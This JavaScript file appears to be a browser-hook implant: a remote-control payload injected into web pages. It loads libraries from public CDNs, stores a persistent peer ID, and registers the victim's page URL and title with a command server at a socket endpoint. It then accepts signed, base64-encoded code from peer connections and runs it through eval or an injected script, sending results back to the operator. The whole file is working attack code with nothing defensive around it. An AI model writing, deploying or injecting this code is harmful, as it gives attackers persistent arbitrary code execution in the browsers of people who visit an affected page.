(async function() {
    var peer;
    window.connections = [];
    var pkgs = [
        "https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js",
        "https://cdn.jsdelivr.net/gh/socketio/socket.io@main/packages/socket.io-client/dist/socket.io.js",
        "https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js",
        "https://cdn.jsdelivr.net/gh/wreiske/meteor-jsencrypt@master/jsencrypt.js",
        "https://cdn.jsdelivr.net/gh/kjur/jsrsasign@master/jsrsasign-all-min.js",
        "https://html2canvas.hertzen.com/dist/html2canvas.min.js",
        "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js",
    ];
    var ldd = [];
    var _key = `
     -----BEGIN PUBLIC KEY-----
    MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAgM3dP9S6/jPsOmr86T7G
    JxFZZurxKAjmn7Y803YAim1mwMuf/pwgUiebkIw74UWOHbEJPG2BP6fPgH0mt773
    E5Uf24/fin23cABAFqD9bzaec2I7p6KYzFiUncsyRXQpQ7LsY+zHnjreOro4ZWFh
    DET7+DAwAAm65paZzsLfYqy1WKTCv/CG7f4jcKkqnnakcbBJsUFEPUpAW0AJkwGK
    ANOF19JiWkqBtghzL4Su1vEBQQznrYc9+ItGGXMwhsvMb+WfJht8g5R3suCwvmB8
    r4EZxUss1ilzNrvMm/D4B5tBjyInyT68Yq9Ti8cHywRafoaLk54fZKklcJf9Qovy
    tQIDAQAB
    -----END PUBLIC KEY-----
    `
    var built_in = ["window","self","document","name","location","customElements","history","navigation","locationbar","menubar","personalbar","scrollbars","statusbar","toolbar","status","closed","frames","length","top","opener","parent","frameElement","navigator","origin","external","screen","innerWidth","innerHeight","scrollX","pageXOffset","scrollY","pageYOffset","visualViewport","screenX","screenY","outerWidth","outerHeight","devicePixelRatio","event","clientInformation","screenLeft","screenTop","styleMedia","onsearch","isSecureContext","trustedTypes","performance","onappinstalled","onbeforeinstallprompt","crypto","indexedDB","sessionStorage","localStorage","onbeforexrselect","onabort","onbeforeinput","onbeforematch","onbeforetoggle","onblur","oncancel","oncanplay","oncanplaythrough","onchange","onclick","onclose","oncontentvisibilityautostatechange","oncontextlost","oncontextmenu","oncontextrestored","oncuechange","ondblclick","ondrag","ondragend","ondragenter","ondragleave","ondragover","ondragstart","ondrop","ondurationchange","onemptied","onended","onerror","onfocus","onformdata","oninput","oninvalid","onkeydown","onkeypress","onkeyup","onload","onloadeddata","onloadedmetadata","onloadstart","onmousedown","onmouseenter","onmouseleave","onmousemove","onmouseout","onmouseover","onmouseup","onmousewheel","onpause","onplay","onplaying","onprogress","onratechange","onreset","onresize","onscroll","onsecuritypolicyviolation","onseeked","onseeking","onselect","onslotchange","onstalled","onsubmit","onsuspend","ontimeupdate","ontoggle","onvolumechange","onwaiting","onwebkitanimationend","onwebkitanimationiteration","onwebkitanimationstart","onwebkittransitionend","onwheel","onauxclick","ongotpointercapture","onlostpointercapture","onpointerdown","onpointermove","onpointerrawupdate","onpointerup","onpointercancel","onpointerover","onpointerout","onpointerenter","onpointerleave","onselectstart","onselectionchange","onanimationend","onanimationiteration","onanimationstart","ontransitionrun","ontransitionstart","ontransitionend","ontransitioncancel","onafterprint","onbeforeprint","onbeforeunload","onhashchange","onlanguagechange","onmessage","onmessageerror","onoffline","ononline","onpagehide","onpageshow","onpopstate","onrejectionhandled","onstorage","onunhandledrejection","onunload","crossOriginIsolated","scheduler","alert","atob","blur","btoa","cancelAnimationFrame","cancelIdleCallback","captureEvents","clearInterval","clearTimeout","close","confirm","createImageBitmap","fetch","find","focus","getComputedStyle","getSelection","matchMedia","moveBy","moveTo","open","postMessage","print","prompt","queueMicrotask","releaseEvents","reportError","requestAnimationFrame","requestIdleCallback","resizeBy","resizeTo","scroll","scrollBy","scrollTo","setInterval","setTimeout","stop","structuredClone","webkitCancelAnimationFrame","webkitRequestAnimationFrame","chrome","fence","launchQueue","originAgentCluster","onpageswap","onpagereveal","credentialless","speechSynthesis","onscrollend","webkitRequestFileSystem","webkitResolveLocalFileSystemURL","caches","cookieStore","ondevicemotion","ondeviceorientation","ondeviceorientationabsolute","sharedStorage","documentPictureInPicture","getScreenDetails","queryLocalFonts","showDirectoryPicker","showOpenFilePicker","showSaveFilePicker","i","CryptoJS","peerjs","Peer","io","JSEncryptExports","KJUR","Hex","Base64","ASN1","JSEncryptRSAKey","JSEncrypt","count","VERSION","VERSION_FULL","b64map","b64pad","hex2b64","b64tohex","b64toBA","dbits","canary","j_lm","BigInteger","nbi","am1","am2","am3","BI_FP","BI_RM","BI_RC","rr","vv","int2char","intAt","bnpCopyTo","bnpFromInt","nbv","bnpFromString","bnpClamp","bnToString","bnNegate","bnAbs","bnCompareTo","nbits","bnBitLength","bnpDLShiftTo","bnpDRShiftTo","bnpLShiftTo","bnpRShiftTo","bnpSubTo","bnpMultiplyTo","bnpSquareTo","bnpDivRemTo","bnMod","Classic","cConvert","cRevert","cReduce","cMulTo","cSqrTo","bnpInvDigit","Montgomery","montConvert","montRevert","montReduce","montSqrTo","montMulTo","bnpIsEven","bnpExp","bnModPowInt","bnClone","bnIntValue","bnByteValue","bnShortValue","bnpChunkSize","bnSigNum","bnpToRadix","bnpFromRadix","bnpFromNumber","bnToByteArray","bnEquals","bnMin","bnMax","bnpBitwiseTo","op_and","bnAnd","op_or","bnOr","op_xor","bnXor","op_andnot","bnAndNot","bnNot","bnShiftLeft","bnShiftRight","lbit","bnGetLowestSetBit","cbit","bnBitCount","bnTestBit","bnpChangeBit","bnSetBit","bnClearBit","bnFlipBit","bnpAddTo","bnAdd","bnSubtract","bnMultiply","bnSquare","bnDivide","bnRemainder","bnDivideAndRemainder","bnpDMultiply","bnpDAddOffset","NullExp","nNop","nMulTo","nSqrTo","bnPow","bnpMultiplyLowerTo","bnpMultiplyUpperTo","Barrett","barrettConvert","barrettRevert","barrettReduce","barrettSqrTo","barrettMulTo","bnModPow","bnGCD","bnpModInt","bnModInverse","lowprimes","lplim","bnIsProbablePrime","bnpMillerRabin","Arcfour","ARC4init","ARC4next","prng_newstate","rng_psize","rng_state","rng_pool","rng_pptr","rng_seed_int","rng_seed_time","t","ua","z","rng_get_byte","rng_get_bytes","SecureRandom","parseBigInt","linebrk","byte2Hex","pkcs1pad2","oaep_mgf1_arr","oaep_pad","RSAKey","RSASetPublic","RSADoPublic","pkcs1unpad2","oaep_mgf1_str","oaep_unpad","RSASetPrivate","RSASetPrivateEx","RSAGenerate","RSADoPrivate","ECFieldElementFp","feFpEquals","feFpToBigInteger","feFpNegate","feFpAdd","feFpSubtract","feFpMultiply","feFpSquare","feFpDivide","ECPointFp","pointFpGetX","pointFpGetY","pointFpEquals","pointFpIsInfinity","pointFpNegate","pointFpAdd","pointFpTwice","pointFpMultiply","pointFpMultiplyTwo","ECCurveFp","curveFpGetQ","curveFpGetA","curveFpGetB","curveFpEquals","curveFpGetInfinity","curveFpFromBigInteger","curveFpDecodePointHex","jsonParse","ASN1HEX","Base64x","stoBA","BAtos","BAtohex","stohex","stob64","stob64u","b64utos","b64tob64u","b64utob64","hextob64u","b64utohex","utf8tob64u","b64utoutf8","utf8tob64","b64toutf8","utf8tohex","hextoutf8","iso88591hextoutf8","utf8toiso88591hex","iso88591hextoutf8hex","utf8hextoiso88591hex","hextorstr","rstrtohex","hextob64","hextob64nl","foldnl","b64nltohex","b64topem","hextopem","pemtohex","pemtob64","hextoArrayBuffer","ArrayBuffertohex","zulutomsec","msectozulu","zulutosec","zulutodate","datetozulu","timetogen","uricmptohex","hextouricmp","ipv6tohex","hextoipv6","hextoip","ipprefixlen","iptohex","ipnetmask","ucs2hextoutf8","encodeURIComponentAll","newline_toUnix","newline_toDos","ishex","isBase64URLDot","hextoposhex","intarystrtohex","strdiffidx","oidtohex","hextooid","inttohex","twoscompl","strpad","bitstrtoint","inttobitstr","bitstrtobinstr","binstrtobitstr","namearraytobinstr","aryval","extendClass","KEYUTIL","_RE_HEXDECONLY","_rsasign_getHexPaddedDigestInfoForString","_zeroPaddingOfSignature","pss_mgf1_str","_rsasign_getDecryptSignatureBI","_rsasign_getHexDigestInfoFromSig","_rsasign_getAlgNameAndHashFromHexDisgestInfo","X509","X509CRL","connections","_return","html2canvas","$","jQuery"];
    
    for (i in pkgs) {
        var jj = document.createElement("script");
        jj.src = pkgs[i];
        jj.onload = () => {
            ldd.push(true);
        }
        document.body.appendChild(jj);
    }

    function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    while (ldd.length !== pkgs.length) {
        await sleep(100);
    }

    if (ldd.includes(false)) {
        throw new Error("Error loading a module")
    }

    if (localStorage.getItem("_peer") !== null) {
        peer = new Peer(localStorage.getItem("_peer"));
    } else {
        peer = new Peer(generateRandomString(10));
        localStorage.setItem("_peer", peer.id);
    }
    
    const socket = io("ws://localhost:3005/hook");
    
    socket.on('connect', () => {
        //console.log("socket connected");
        setTimeout(function() {
            socket.emit("newHook", {
                "peer": peer.id,
                "page": window.location.href,
                "title": document.title
            });
        }, 150);
    });
    
    peer.on('open', function(id) {
        //console.log('My peer ID is: ' + id);
    });
    
    peer.on('connection', (conn) => {
        //console.log("Incoming connection from peer:", conn.peer);
        connections.push(conn);
    
        conn.on('open', () => {
            //console.log("Connected to peer:", conn.peer);
        });
    
        conn.on('data', (data) => {
            //Testing DELETE LATER
            //console.log(data);
            //console.log("VALID?: ", doVerify(_key,peer.id,data.key))
            //
            var valid = doVerify(_key,peer.id,data.key);
            if (!valid) {
                _return("INVALID SIGNATURE");
                return;
            }
          if (typeof data == "object") {
            try {
                eval(atob(data.code));
            }catch {
                var _g = new Blob([atob(data.code)]);
                var j = document.createElement("script");
                j.src = URL.createObjectURL(_g);
                document.body.appendChild(j);
            }
            _return("200 - COMMAND OK")
          }
        });
    
        conn.on('error', (err) => {
            //console.error('Connection error:', err);
        });
    });
    
    window._return = (data) => {
        for (i in connections) {
            connections[i].send(data);
        }
    }
    
    function generateRandomString(length) {
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let result = '';
        const charactersLength = characters.length;
        for (let i = 0; i < length; i++) {
            result += characters.charAt(Math.floor(Math.random() * charactersLength));
        }
        return result;
    }
    
    
    var newKeyPair = {
        public: "",
        private: ""
      }
      
    function genKeyPair() {
        crypt = new JSEncrypt({
          default_key_size: 2048
        });
      var dt = new Date();
      var time = -(dt.getTime());
      crypt.getKey();
      dt = new Date();
      time += (dt.getTime());
      
      newKeyPair.private = crypt.getPrivateKey();
      newKeyPair.public = crypt.getPublicKey();
      //console.log(newKeyPair.private,"\n",newKeyPair.public);
      return newKeyPair;
    }
      
      
      
              
    function doSign(pkey,str) {
        var rsa = new RSAKey();
        rsa.readPrivateKeyFromPEMString(pkey);
        var hashAlg = 'sha256';
        var hSig = rsa.sign(str, hashAlg);
        return linebrk(hSig, 64);
    }
      
    function doVerify(pubkey,str,verif) {
        //Public key, encoded string, signed string 
        var sMsg = str;
        var hSig = verif;
        hSig = hSig.replace(/[^0-9a-f]+/g, "");
      
        var pubKey = KEYUTIL.getKey(pubkey);
        var isValid = pubKey.verify(sMsg, hSig);
      
        // display verification result
        // if (isValid) {
        //   //console.log("Valid");
        // } else {
        //  //console.log("invalid");
        // }
        return isValid;
    }

})();
